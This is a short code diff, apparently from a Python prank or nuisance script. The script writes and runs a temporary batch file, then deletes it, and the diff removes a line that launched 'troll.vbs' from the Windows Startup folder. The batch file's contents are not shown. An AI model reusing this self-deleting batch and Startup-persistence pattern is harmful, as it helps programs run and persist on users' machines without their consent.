@@ -16,5 +16,4 @@ with open("AKAKKAKAKAK.bat", "w", encoding="utf-8") as file:
 	file.writelines(lines)
 os.system("AKAKKAKAKAK.bat")
 os.system("timeout /t 1 > nul")
-os.system('"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\troll.vbs"')
-os.system("del AKAKKAKAKAK.bat"
+os.system("del AKAKKAKAKAK.bat")
